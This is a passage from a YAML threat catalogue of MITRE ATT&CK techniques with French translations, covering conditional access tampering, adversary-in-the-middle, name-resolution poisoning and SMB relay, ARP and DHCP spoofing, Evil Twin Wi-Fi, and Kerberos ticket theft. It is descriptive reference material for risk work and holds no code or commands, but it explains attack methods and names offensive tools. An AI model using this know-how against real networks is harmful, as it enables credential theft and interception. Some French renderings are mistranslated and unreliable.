        description: "Les adversaires peuvent d\xE9sactiver ou modifier les politiques\
          \ d\u2019acc\xE8s conditionnel pour permettre un acc\xE8s persistant aux\
          \ comptes compromis. Les politiques d\u2019acc\xE8s conditionnel sont des\
          \ v\xE9rifications suppl\xE9mentaires utilis\xE9es par les fournisseurs\
          \ d\u2019identit\xE9 et les syst\xE8mes de gestion d\u2019identit\xE9 et\
          \ d\u2019acc\xE8s pour d\xE9terminer si un utilisateur doit obtenir l\u2019\
          acc\xE8s \xE0 une ressource.\n\nPar exemple, dans Entra ID, Okta et JumpCloud,\
          \ les utilisateurs peuvent se voir refuser l\u2019acc\xE8s aux applications\
          \ en raison de leur adresse IP, de leur statut d\u2019inscription de l\u2019\
          appareil et de l\u2019utilisation d\u2019une authentification multi-facteurs.\
          \ (Citation : Microsoft Conditional Access)(Citation : Politiques d\u2019\
          acc\xE8s conditionnel JumpCloud)(Citation : Politiques d\u2019acc\xE8s conditionnel\
          \ Okta) Dans certains cas, les fournisseurs d\u2019identit\xE9 peuvent \xE9\
          galement soutenir l\u2019utilisation de m\xE9triques bas\xE9es sur le risque\
          \ pour refuser les connexions sur la base de divers indicateurs. Dans AWS\
          \ et GCP, les politiques IAM peuvent contenir des attributs de \xAB condition\
          \ \xBB qui v\xE9rifient des contraintes arbitraires telles que l\u2019IP\
          \ source, la date de la demande et la nature des ressources ou r\xE9gions\
          \ demand\xE9es. (Citation : AWS IAM Conditions)(Citation : Conditions GCP\
          \ IAM) Ces mesures aident \xE0 emp\xEAcher que des identifiants compromis\
          \ ne conduisent \xE0 un acc\xE8s non autoris\xE9 aux donn\xE9es ou ressources,\
          \ tout en limitant les autorisations utilisateur \xE0 celles requises. \n\
          \nEn modifiant les politiques d\u2019acc\xE8s conditionnel, telles que l\u2019\
          ajout de plages IP de confiance suppl\xE9mentaires, la suppression des exigences\
          \ d\u2019authentification multifactorielle(https://attack.mitre.org/techniques/T1556/006),\
          \ ou la possibilit\xE9 d\u2019ajouter des [R\xE9gions Cloud inutilis\xE9\
          es/non support\xE9es](https://attack.mitre.org/techniques/T1535), les adversaires\
          \ peuvent garantir un acc\xE8s persistant aux comptes et contourner les\
          \ mesures d\xE9fensives.\nhttps://attack.mitre.org/techniques/T1556/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557
    ref_id: T1557
    name: Adversary-in-the-Middle
    description: 'Adversaries may attempt to position themselves between two or more
      networked devices using an adversary-in-the-middle (AiTM) technique to support
      follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040),
      [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002),
      or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)).
      By abusing features of common networking protocols that can determine the flow
      of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device
      to communicate through an adversary controlled system so they can collect information
      or perform additional actions.(Citation: Rapid7 MiTM Basics)


      For example, adversaries may manipulate victim DNS settings to enable other
      malicious activities such as preventing/redirecting users from accessing legitimate
      sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation:
      ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their
      position in order to intercept user credentials, including access tokens ([Steal
      Application Access Token](https://attack.mitre.org/techniques/T1528)) and session
      cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation:
      volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1689)s
      can also be used to establish an AiTM position, such as by negotiating a less
      secure, deprecated, or weaker version of communication protocol (SSL/TLS) or
      encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation:
      tlseminar_downgrade_att)


      Adversaries may also leverage the AiTM position to attempt to monitor and/or
      modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).
      Adversaries can setup a position similar to AiTM to prevent traffic from flowing
      to the appropriate destination, potentially to impair defenses and/or in support
      of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).

      https://attack.mitre.org/techniques/T1557'
    translations:
      fr:
        name: Adversaire du milieu
        description: "Les adversaires peuvent tenter de se positionner entre deux\
          \ ou plusieurs dispositifs connect\xE9s en r\xE9seau en utilisant une technique\
          \ adversaire-in-the-middle (AiTM) pour soutenir des comportements ult\xE9\
          rieurs tels que [Network Sniffing](https://attack.mitre.org/techniques/T1040),\
          \ [Transmission de donn\xE9es manipulation](https://attack.mitre.org/techniques/T1565/002)\
          \ ou des attaques de relecture ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)).\
          \ En abusant des fonctionnalit\xE9s des protocoles r\xE9seau courants qui\
          \ peuvent d\xE9terminer le flux du trafic r\xE9seau (par exemple ARP, DNS,\
          \ LLMNR, etc.), les adversaires peuvent forcer un appareil \xE0 communiquer\
          \ via un syst\xE8me contr\xF4l\xE9 par l\u2019adversaire afin de collecter\
          \ des informations ou d\u2019effectuer des actions suppl\xE9mentaires. (Citation\
          \ : Bases de Rapid7 MiTM)\n\nPar exemple, les adversaires peuvent manipuler\
          \ les param\xE8tres DNS des victimes pour permettre d\u2019autres activit\xE9\
          s malveillantes, telles que l\u2019emp\xEAchement/redirection des utilisateurs\
          \ d\u2019acc\xE9der \xE0 des sites l\xE9gitimes et/ou la diffusion de logiciels\
          \ malveillants suppl\xE9mentaires. (Citation : ttint_rat)(Citation : dns_changer_trojans)(Citation\
          \ : ad_blocker_with_miner) Les adversaires peuvent \xE9galement manipuler\
          \ le DNS et exploiter leur position pour intercepter les identifiants des\
          \ utilisateurs, y compris les jetons d\u2019acc\xE8s ([Voler le jeton d\u2019\
          acc\xE8s \xE0 l\u2019application](https://attack.mitre.org/techniques/T1528))\
          \ et les cookies de session ([Voler le cookie de session Web](https://attack.mitre.org/techniques/T1539)).\
          \ (Citation : volexity_0day_sophos_FW)(Citation : Tactiques symboliques)\
          \ [Attaque de r\xE9trogradation](https://attack.mitre.org/techniques/T1689)s\
          \ peuvent \xE9galement \xEAtre utilis\xE9s pour \xE9tablir une position\
          \ AiTM, par exemple en n\xE9gociant une version moins s\xE9curis\xE9e, obsol\xE8\
          te ou plus faible du protocole de communication (SSL/TLS) ou d\u2019un algorithme\
          \ de chiffrement. (Citation : mitm_tls_downgrade_att)(Citation : taxonomy_downgrade_att_tls)(Citation\
          \ : tlseminar_downgrade_att)\n\nLes adversaires peuvent \xE9galement utiliser\
          \ la position AiTM pour tenter de surveiller et/ou modifier le trafic, comme\
          \ dans [Manipulation des donn\xE9es transmises](https://attack.mitre.org/techniques/T1565/002).\
          \ Les adversaires peuvent installer une position similaire \xE0 AiTM pour\
          \ emp\xEAcher le trafic de se diriger vers la destination appropri\xE9e,\
          \ potentiellement pour compromettre les d\xE9fenses et/ou soutenir un [d\xE9\
          ni de service r\xE9seau](https://attack.mitre.org/techniques/T1498).\nhttps://attack.mitre.org/techniques/T1557"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557.001
    ref_id: T1557.001
    name: Name Resolution Poisoning and SMB Relay
    description: "By responding to LLMNR/NBT-NS/mDNS network traffic, adversaries\
      \ may spoof an authoritative source for name resolution to force communication\
      \ with an adversary controlled system.(Citation: BlackCat ransomware) This activity\
      \ may be used to collect or relay authentication materials. \n\nLink-Local Multicast\
      \ Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows\
      \ components that serve as alternate methods of host identification. LLMNR is\
      \ based upon the Domain Name System (DNS) format and allows hosts on the same\
      \ local link to perform name resolution for other hosts. NBT-NS identifies systems\
      \ on a local network by their NetBIOS name.(Citation: Wikipedia LLMNR)(Citation:\
      \ TechNet NetBIOS)\n\nMulticast Domain Name System(mDNS) is a zero-configuration\
      \ service used to resolve hostnames to IP addresses with \u201C.local\u201D\
      \ as a top-level domain. MDNS is based upon Domain Name System (DNS) format\
      \ and allows hosts on the same network segment to perform name resolution for\
      \ other hosts, using multicast.(Citation: mDNS RFC)\n\nAdversaries can spoof\
      \ an authoritative source for name resolution on a victim network by responding\
      \ to LLMNR (UDP 5355)/NBT-NS (UDP 137)/mDNS (UDP 5353) traffic as if they know\
      \ the identity of the requested host, effectively poisoning the service so that\
      \ the victims will communicate with the adversary controlled system. If the\
      \ requested host belongs to a resource that requires identification/authentication,\
      \ the username and NTLMv2 hash will then be sent to the adversary controlled\
      \ system. The adversary can then collect the hash information sent over the\
      \ wire through tools that monitor the ports for traffic or through [Network\
      \ Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes\
      \ offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to\
      \ obtain the plaintext passwords.\n\nIn some cases where an adversary has access\
      \ to a system that is in the authentication path between systems or when automated\
      \ scans that use credentials attempt to authenticate to an adversary controlled\
      \ system, the NTLMv1/v2 hashes can be intercepted and relayed to access and\
      \ execute code against a target system. The relay step can happen in conjunction\
      \ with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM\
      \ Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may\
      \ encapsulate the NTLMv1/v2 hashes into various other protocols, such as LDAP,\
      \ MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\_\
      \n\nSeveral tools may be used to poison name services within local networks\
      \ such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation:\
      \ GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)\n\
      https://attack.mitre.org/techniques/T1557/001"
    translations:
      fr:
        name: "Empoisonnement par r\xE9solution de noms et relais SMB"
        description: "En r\xE9pondant au trafic r\xE9seau LLMNR/NBT-NS/mDNS, les adversaires\
          \ peuvent usurper une source autoritaire pour la r\xE9solution de noms afin\
          \ de forcer la communication avec un syst\xE8me contr\xF4l\xE9 par l\u2019\
          adversaire. (Citation : ransomware BlackCat) Cette activit\xE9 peut \xEA\
          tre utilis\xE9e pour collecter ou relayer des documents d\u2019authentification.\
          \ \n\nLa r\xE9solution de noms multicast local par lien (LLMNR) et le service\
          \ de noms NetBIOS (NBT-NS) sont des composants Microsoft Windows qui servent\
          \ de m\xE9thodes alternatives d\u2019identification de l\u2019h\xF4te. Le\
          \ LLMNR est bas\xE9 sur le format Domain Name System (DNS) et permet aux\
          \ h\xF4tes sur le m\xEAme lien local d\u2019effectuer la r\xE9solution de\
          \ noms pour d\u2019autres h\xF4tes. NBT-NS identifie les syst\xE8mes sur\
          \ un r\xE9seau local par leur nom NetBIOS. (Citation : Wikip\xE9dia LLMNR)(Citation\
          \ : TechNet NetBIOS)\n\nLe syst\xE8me de noms de domaine multicast (mDNS)\
          \ est un service sans configuration utilis\xE9e pour r\xE9soudre des noms\
          \ d\u2019h\xF4te en adresses IP avec \xAB .local \xBB comme domaine de premier\
          \ niveau. Le MDNS est bas\xE9 sur le format Domain Name System (DNS) et\
          \ permet aux h\xF4tes du m\xEAme segment r\xE9seau d\u2019effectuer la r\xE9\
          solution de noms pour d\u2019autres h\xF4tes, en utilisant le multicast.\
          \ (Citation : mDNS RFC)\n\nLes adversaires peuvent usurper une source autoritaire\
          \ pour la r\xE9solution de noms sur un r\xE9seau victime en r\xE9pondant\
          \ au trafic LLMNR (UDP 5355)/NBT-NS (UDP 137)/mDNS (UDP 5353) comme s\u2019\
          ils connaissaient l\u2019identit\xE9 de l\u2019h\xF4te demand\xE9, empoisonnant\
          \ ainsi le service afin que les victimes communiquent avec le syst\xE8me\
          \ contr\xF4l\xE9 par l\u2019adversaire. Si l\u2019h\xF4te demand\xE9 appartient\
          \ \xE0 une ressource n\xE9cessitant une identification/authentification,\
          \ le nom d\u2019utilisateur et le hachage NTLMv2 seront alors envoy\xE9\
          s au syst\xE8me contr\xF4l\xE9 par l\u2019adversaire. L\u2019adversaire\
          \ peut alors collecter les informations de hachage envoy\xE9es via le fil\
          \ via des outils qui surveillent les ports pour le trafic ou via [Network\
          \ Sniffing](https://attack.mitre.org/techniques/T1040) et craquer les hachages\
          \ hors ligne via [Brute Force](https://attack.mitre.org/techniques/T1110)\
          \ pour obtenir les mots de passe en clair.\n\nDans certains cas o\xF9 un\
          \ adversaire a acc\xE8s \xE0 un syst\xE8me situ\xE9 sur la voie d\u2019\
          authentification entre les syst\xE8mes ou lorsque des scans automatis\xE9\
          s utilisant des identifiants tentent de s\u2019authentifier \xE0 un syst\xE8\
          me contr\xF4l\xE9 par l\u2019adversaire, les hachages NTLMv1/v2 peuvent\
          \ \xEAtre intercept\xE9s et relay\xE9s pour acc\xE9der et ex\xE9cuter du\
          \ code sur un syst\xE8me cible. L\u2019\xE9tape du relais peut se produire\
          \ en m\xEAme temps qu\u2019un empoisonnement mais peut aussi \xEAtre ind\xE9\
          pendante de celle-ci. (Citation : byt3bl33d3r NTLM Relaying)(Citation :\
          \ Relais SMB Id\xE9es s\xE9curis\xE9es) De plus, les adversaires peuvent\
          \ encapsuler les hachages NTLMv1/v2 dans divers autres protocoles, tels\
          \ que LDAP, MSSQL et HTTP, afin d\u2019\xE9tendre et d\u2019utiliser plusieurs\
          \ services avec la r\xE9ponse NTLM valide.\_\n\nPlusieurs outils peuvent\
          \ \xEAtre utilis\xE9s pour empoisonner les services de noms au sein des\
          \ r\xE9seaux locaux tels que NBNSpoof, Metasploit et [Responder](https://attack.mitre.org/software/S0174).\
          \ (Citation : GitHub NBNSpoof)(Citation : Rapid7 LLMNR Spoofer)(Citation\
          \ : GitHub Responder)\nhttps://attack.mitre.org/techniques/T1557/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557.002
    ref_id: T1557.002
    name: ARP Cache Poisoning
    description: 'Adversaries may poison Address Resolution Protocol (ARP) caches
      to position themselves between the communication of two or more networked devices.
      This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040)
      or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).


      The ARP protocol is used to resolve IPv4 addresses to link layer addresses,
      such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices
      in a local network segment communicate with each other by using link layer addresses.
      If a networked device does not have the link layer address of a particular networked
      device, it may send out a broadcast ARP request to the local network to translate
      the IP address to a MAC address. The device with the associated IP address directly
      replies with its MAC address. The networked device that made the ARP request
      will then use as well as store that information in its ARP cache.


      An adversary may passively wait for an ARP request to poison the ARP cache of
      the requesting device. The adversary may reply with their MAC address, thus
      deceiving the victim by making them believe that they are communicating with
      the intended networked device. For the adversary to poison the ARP cache, their
      reply must be faster than the one made by the legitimate IP address owner. Adversaries
      may also send a gratuitous ARP reply that maliciously announces the ownership
      of a particular IP address to all the devices in the local network segment.


      The ARP protocol is stateless and does not require authentication. Therefore,
      devices may wrongly add or update the MAC address of the IP address in their
      ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)


      Adversaries may use ARP cache poisoning as a means to intercept network traffic.
      This activity may be used to collect and/or relay data such as credentials,
      especially those sent over an insecure, unencrypted protocol.(Citation: Sans
      ARP Spoofing Aug 2003)

      https://attack.mitre.org/techniques/T1557/002'
    translations:
      fr:
        name: Empoisonnement du cache ARP
        description: "Les adversaires peuvent empoisonner les caches du protocole\
          \ de r\xE9solution d\u2019adresses (ARP) pour se positionner entre la communication\
          \ de deux appareils en r\xE9seau ou plus. Cette activit\xE9 peut \xEAtre\
          \ utilis\xE9e pour permettre des comportements ult\xE9rieurs tels que [Reniflement\
          \ r\xE9seau](https://attack.mitre.org/techniques/T1040) ou [Manipulation\
          \ des donn\xE9es transmises](https://attack.mitre.org/techniques/T1565/002).\n\
          \nLe protocole ARP est utilis\xE9 pour r\xE9soudre des adresses IPv4 en\
          \ adresses de couche liaison, telles qu\u2019une adresse de contr\xF4le\
          \ d\u2019acc\xE8s au m\xE9dia (MAC). (Citation : RFC826 ARP) Les appareils\
          \ d\u2019un segment r\xE9seau local communiquent entre eux en utilisant\
          \ des adresses de couche liaison. Si un appareil en r\xE9seau ne poss\xE8\
          de pas l\u2019adresse de couche liaison d\u2019un appareil r\xE9seau particulier,\
          \ il peut envoyer une requ\xEAte ARP de diffusion au r\xE9seau local pour\
          \ traduire l\u2019adresse IP en adresse MAC. L\u2019appareil avec l\u2019\
          adresse IP associ\xE9e r\xE9pond directement avec son adresse MAC. L\u2019\
          appareil r\xE9seau qui a effectu\xE9 la requ\xEAte ARP utilisera alors et\
          \ stockera ces informations dans son cache ARP.\n\nUn adversaire peut attendre\
          \ passivement qu\u2019une requ\xEAte ARP poisonne le cache ARP du p\xE9\
          riph\xE9rique demandeur. L\u2019adversaire peut r\xE9pondre avec son adresse\
          \ MAC, trompant ainsi la victime en lui faisant croire qu\u2019elle communique\
          \ avec l\u2019appareil r\xE9seau pr\xE9vu. Pour que l\u2019adversaire empoisonne\
          \ le cache ARP, sa r\xE9ponse doit \xEAtre plus rapide que celle du propri\xE9\
          taire l\xE9gitime de l\u2019adresse IP. Les adversaires peuvent \xE9galement\
          \ envoyer une r\xE9ponse ARP gratuite qui annonce malicieusement la propri\xE9\
          t\xE9 d\u2019une adresse IP particuli\xE8re \xE0 tous les appareils du segment\
          \ r\xE9seau local.\n\nLe protocole ARP est sans \xE9tat et ne n\xE9cessite\
          \ pas d\u2019authentification. Par cons\xE9quent, les appareils peuvent\
          \ \xE0 tort ajouter ou mettre \xE0 jour l\u2019adresse MAC de l\u2019adresse\
          \ IP dans leur cache ARP. (Citation : Sans usurpation ARP ao\xFBt 2003)(Citation\
          \ : Cylance Cleaver)\n\nLes adversaires peuvent utiliser l\u2019empoisonnement\
          \ du cache ARP comme moyen d\u2019intercepter le trafic r\xE9seau. Cette\
          \ activit\xE9 peut \xEAtre utilis\xE9e pour collecter et/ou relayer des\
          \ donn\xE9es telles que des identifiants, en particulier celles envoy\xE9\
          es via un protocole non s\xE9curis\xE9 et non chiffr\xE9. (Citation : Sans\
          \ usurpation ARP ao\xFBt 2003)\nhttps://attack.mitre.org/techniques/T1557/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557.003
    ref_id: T1557.003
    name: DHCP Spoofing
    description: "Adversaries may redirect network traffic to adversary-owned systems\
      \ by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting\
      \ as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle\
      \ (AiTM) position, adversaries may collect network communications, including\
      \ passed credentials, especially those sent over insecure, unencrypted protocols.\
      \ This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040)\
      \ or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\
      \nDHCP is based on a client-server model and has two functionalities: a protocol\
      \ for providing network configuration settings from a DHCP server to a client\
      \ and a mechanism for allocating network addresses to clients.(Citation: rfc2131)\
      \ The typical server-client interaction is as follows: \n\n1. The client broadcasts\
      \ a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which\
      \ includes an available network address. \n\n3. The client broadcasts a `REQUEST`\
      \ message, which includes the network address offered. \n\n4. The server acknowledges\
      \ with an `ACK` message and the client receives the network configuration parameters.\n\
      \nAdversaries may spoof as a rogue DHCP server on the victim network, from which\
      \ legitimate hosts may receive malicious network configurations. For example,\
      \ malware can act as a DHCP server and provide adversary-owned DNS servers to\
      \ the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation:\
      \ w32.tidserv.g) Through the malicious network configurations, an adversary\
      \ may achieve the AiTM position, route client traffic through adversary-controlled\
      \ systems, and collect information from the client network.\n\nDHCPv6 clients\
      \ can receive network configuration information without being assigned an IP\
      \ address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to\
      \ the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation:\
      \ rfc3315) Adversaries may use their rogue DHCP server to respond to this request\
      \ message with malicious network configurations.\n\nRather than establishing\
      \ an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP\
      \ exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002))\
      \ by generating many broadcast DISCOVER messages to exhaust a network\u2019\
      s DHCP allocation pool.\nhttps://attack.mitre.org/techniques/T1557/003"
    translations:
      fr:
        name: Usurpation DHCP
        description: "Les adversaires peuvent rediriger le trafic r\xE9seau vers des\
          \ syst\xE8mes appartenant \xE0 l\u2019adversaire en usurpant le trafic du\
          \ protocole de configuration dynamique h\xF4te (DHCP) et en agissant comme\
          \ un serveur DHCP malveillant sur le r\xE9seau victime. En atteignant la\
          \ position adversaire du milieu (AiTM), les adversaires peuvent collecter\
          \ des communications r\xE9seau, y compris les identifiants pass\xE9s, en\
          \ particulier ceux envoy\xE9s via des protocoles non s\xE9curis\xE9s et\
          \ non chiffr\xE9s. Cela peut \xE9galement permettre des comportements ult\xE9\
          rieurs tels que [Reniflement r\xE9seau](https://attack.mitre.org/techniques/T1040)\
          \ ou [Manipulation de donn\xE9es transmises](https://attack.mitre.org/techniques/T1565/002).\n\
          \nLe DHCP est bas\xE9 sur un mod\xE8le client-serveur et poss\xE8de deux\
          \ fonctionnalit\xE9s : un protocole pour fournir les param\xE8tres de configuration\
          \ r\xE9seau d\u2019un serveur DHCP \xE0 un client, et un m\xE9canisme pour\
          \ attribuer des adresses r\xE9seau aux clients. (Citation : rfc2131) L\u2019\
          interaction typique serveur-client est la suivante : \n\n1. Le client diffuse\
          \ un message \xAB D\xC9COUVRIR \xBB.\n\n2. Le serveur r\xE9pond par un message\
          \ \xAB OFFRE \xBB, qui inclut une adresse r\xE9seau disponible. \n\n3. Le\
          \ client diffuse un message \xAB REQU\xCATE \xBB, qui inclut l\u2019adresse\
          \ r\xE9seau propos\xE9e. \n\n4. Le serveur accuse r\xE9ception par un message\
          \ \xAB ACK \xBB et le client re\xE7oit les param\xE8tres de configuration\
          \ r\xE9seau.\n\nLes adversaires peuvent usurper en tant que serveur DHCP\
          \ malveillant sur le r\xE9seau victime, d\u2019o\xF9 les h\xF4tes l\xE9\
          gitimes peuvent recevoir des configurations r\xE9seau malveillantes. Par\
          \ exemple, un malware peut agir comme un serveur DHCP et fournir des serveurs\
          \ DNS appartenant \xE0 l\u2019adversaire aux ordinateurs victimes. (Citation\
          \ : new_rogue_DHCP_serv_malware)(Citation : w32.tidserv.g) Gr\xE2ce aux\
          \ configurations r\xE9seau malveillantes, un adversaire peut atteindre la\
          \ position AiTM, acheminer le trafic client via des syst\xE8mes contr\xF4\
          l\xE9s par l\u2019adversaire, et collecter des informations du r\xE9seau\
          \ client.\n\nLes clients DHCPv6 peuvent recevoir des informations de configuration\
          \ r\xE9seau sans se voir attribuer d\u2019adresse IP en envoyant un <code>message\
          \ INFORMATION-REQUEST (code 11)</code> \xE0 l\u2019adresse <code>multicast\
          \ All_DHCP_Relay_Agents_and_Servers</code>. (Citation : rfc3315) Les adversaires\
          \ peuvent utiliser leur serveur DHCP malveillant pour r\xE9pondre \xE0 ce\
          \ message de requ\xEAte avec des configurations r\xE9seau malveillantes.\n\
          \nPlut\xF4t que d\u2019\xE9tablir une position AiTM, les adversaires peuvent\
          \ aussi abuser de l\u2019usurpation DHCP pour effectuer une attaque d\u2019\
          \xE9puisement DHCP (c\u2019est-\xE0-dire [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002))\
          \ en g\xE9n\xE9rant de nombreux messages DISCOVER diffus\xE9s pour \xE9\
          puiser le pool d\u2019allocation DHCP d\u2019un r\xE9seau.\nhttps://attack.mitre.org/techniques/T1557/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557.004
    ref_id: T1557.004
    name: Evil Twin
    description: "Adversaries may host seemingly genuine Wi-Fi access points to deceive\
      \ users into connecting to malicious networks as a way of supporting follow-on\
      \ behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040),\
      \ [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002),\
      \ or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia\
      \ \u2018Evil Twin\u2019)\n\nBy using a Service Set Identifier (SSID) of a legitimate\
      \ Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into\
      \ connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation:\
      \ medium evil twin)  Adversaries may provide a stronger signal strength or block\
      \ access to Wi-Fi access points to coerce or entice victim devices into connecting\
      \ to malicious networks.(Citation: specter ops evil twin)  A Wi-Fi Pineapple\
      \ \u2013 a network security auditing and penetration testing tool \u2013 may\
      \ be deployed in Evil Twin attacks for ease of use and broader range. Custom\
      \ certificates may be used in an attempt to intercept HTTPS traffic. \n\nSimilarly,\
      \ adversaries may also listen for client devices sending probe requests for\
      \ known or previously connected networks (Preferred Network Lists or PNLs).\
      \ When a malicious access point receives a probe request, adversaries can respond\
      \ with the same SSID to imitate the trusted, known network.(Citation: specter\
      \ ops evil twin)  Victim devices are led to believe the responding access point\
      \ is from their PNL and initiate a connection to the fraudulent network.\n\n\
      Upon logging into the malicious Wi-Fi access point, a user may be directed to\
      \ a fake login page or captive portal webpage to capture the victim\u2019s credentials.\
      \ Once a user is logged into the fraudulent Wi-Fi network, the adversary may\
      \ able to monitor network activity, manipulate data, or steal additional credentials.\
      \ Locations with high concentrations of public Wi-Fi access, such as airports,\
      \ coffee shops, or libraries, may be targets for adversaries to set up illegitimate\
      \ Wi-Fi access points.\nhttps://attack.mitre.org/techniques/T1557/004"
    translations:
      fr:
        name: "Jumeau mal\xE9fique"
        description: "Les adversaires peuvent h\xE9berger des points d\u2019acc\xE8\
          s Wi-Fi apparemment authentiques pour tromper les utilisateurs et les forcer\
          \ \xE0 se connecter \xE0 des r\xE9seaux malveillants afin de soutenir des\
          \ comportements ult\xE9rieurs tels que [Reniflement r\xE9seau](https://attack.mitre.org/techniques/T1040),\
          \ [Manipulation de donn\xE9es transmises](https://attack.mitre.org/techniques/T1565/002)\
          \ ou [Capture d\u2019entr\xE9e](https://attack.mitre.org/techniques/T1056).\
          \ (Citation : \xAB Jumeau mal\xE9fique \xBB de l\u2019Australie)\n\nEn utilisant\
          \ un identifiant de service (SSID) d\u2019un r\xE9seau Wi-Fi l\xE9gitime,\
          \ des points d\u2019acc\xE8s Wi-Fi frauduleux peuvent tromper des appareils\
          \ ou des utilisateurs en les incitant \xE0 se connecter \xE0 des r\xE9seaux\
          \ Wi-Fi malveillants. (Citation : Kaspersky jumeau mal\xE9fique)(Citation\
          \ : jumeau moyen mal\xE9fique)  Les adversaires peuvent fournir une puissance\
          \ de signal plus forte ou bloquer l\u2019acc\xE8s aux points d\u2019acc\xE8\
          s Wi-Fi pour contraindre ou inciter les appareils victimes \xE0 se connecter\
          \ \xE0 des r\xE9seaux malveillants. (Citation : Specter Ops Evil Twin) \
          \ Un Wi-Fi Pineapple \u2013 un outil d\u2019audit de s\xE9curit\xE9 r\xE9\
          seau et de tests d\u2019intrusion \u2013 peut \xEAtre d\xE9ploy\xE9 dans\
          \ les attaques Evil Twins pour plus de facilit\xE9 d\u2019utilisation et\
          \ une gamme plus large. Des certificats personnalis\xE9s peuvent \xEAtre\
          \ utilis\xE9s pour tenter d\u2019intercepter le trafic HTTPS. \n\nDe m\xEA\
          me, les adversaires peuvent \xE9galement \xE9couter les appareils clients\
          \ envoyant des requ\xEAtes de sonde pour des r\xE9seaux connus ou d\xE9\
          j\xE0 connect\xE9s (listes de r\xE9seaux pr\xE9f\xE9r\xE9s ou PNL). Lorsqu\u2019\
          un point d\u2019acc\xE8s malveillant re\xE7oit une requ\xEAte de sonde,\
          \ les adversaires peuvent r\xE9pondre avec le m\xEAme SSID pour imiter le\
          \ r\xE9seau connu et de confiance. (Citation : Specter Ops Evil Twin)  Les\
          \ appareils victimes sont amen\xE9s \xE0 croire que le point d\u2019acc\xE8\
          s r\xE9pondant provient de leur PNL et initient une connexion au r\xE9seau\
          \ frauduleux.\n\nEn se connectant au point d\u2019acc\xE8s Wi-Fi malveillant,\
          \ un utilisateur peut \xEAtre dirig\xE9 vers une fausse page de connexion\
          \ ou une page web de portail captif pour capturer les identifiants de la\
          \ victime. Une fois qu\u2019un utilisateur est connect\xE9 au r\xE9seau\
          \ Wi-Fi frauduleux, l\u2019adversaire peut \xEAtre capable de surveiller\
          \ l\u2019activit\xE9 du r\xE9seau, de manipuler des donn\xE9es ou de voler\
          \ des identifiants suppl\xE9mentaires. Les lieux avec une forte concentration\
          \ d\u2019acc\xE8s Wi-Fi public, comme les a\xE9roports, les caf\xE9s ou\
          \ les biblioth\xE8ques, peuvent \xEAtre des cibles pour des adversaires\
          \ qui installent des points d\u2019acc\xE8s Wi-Fi ill\xE9gitimes.\nhttps://attack.mitre.org/techniques/T1557/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558
    ref_id: T1558
    name: Steal or Forge Kerberos Tickets
    description: "Adversaries may attempt to subvert Kerberos authentication by stealing\
      \ or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003).\
      \ Kerberos is an authentication protocol widely used in modern Windows domain\
      \ environments. In Kerberos environments, referred to as \u201Crealms\u201D\
      , there are three basic participants: client, service, and Key Distribution\
      \ Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request\
      \ access to a service and through the exchange of Kerberos tickets, originating\
      \ from KDC, they are granted access after having successfully authenticated.\
      \ The KDC is responsible for both authentication and ticket granting.  Adversaries\
      \ may attempt to abuse Kerberos by stealing tickets or forging tickets to enable\
      \ unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility\
      \ can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft\
      \ Klist)\nhttps://attack.mitre.org/techniques/T1558"
    translations:
      fr:
        name: Volez ou falsifiez des tickets de Kerberos
        description: "Les adversaires peuvent tenter de contourner l\u2019authentification\
          \ de Kerberos en volant ou en falsificant des tickets Kerberos pour permettre\
